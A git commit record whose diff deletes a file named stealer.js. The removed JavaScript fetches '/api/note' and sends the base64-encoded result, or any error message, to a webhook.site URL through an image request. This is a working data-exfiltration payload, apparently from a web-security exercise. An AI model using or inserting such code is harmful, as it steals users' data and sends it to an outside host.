82fdcffdc62396d42f9fd96a4666ad7fa8bdffeb
G-Xhaho <g.xhaho1@gmail.com>
2025-09-13 13:54:09 +0200

    Delete stealer.js

--- stealer.js
+++
@@ -1,8 +0,0 @@
-fetch('/api/note')
-  .then(r => r.text())
-  .then(txt => {
-    new Image().src = 'https://webhook.site/76f02fe0-b6fd-4d42-8c8f-3a862256e588?dump=' + btoa(txt);
-  })
-  .catch(e => {
-    new Image().src = 'https://webhook.site/76f02fe0-b6fd-4d42-8c8f-3a862256e588?fail=' + encodeURIComponent(e.message);
-  });
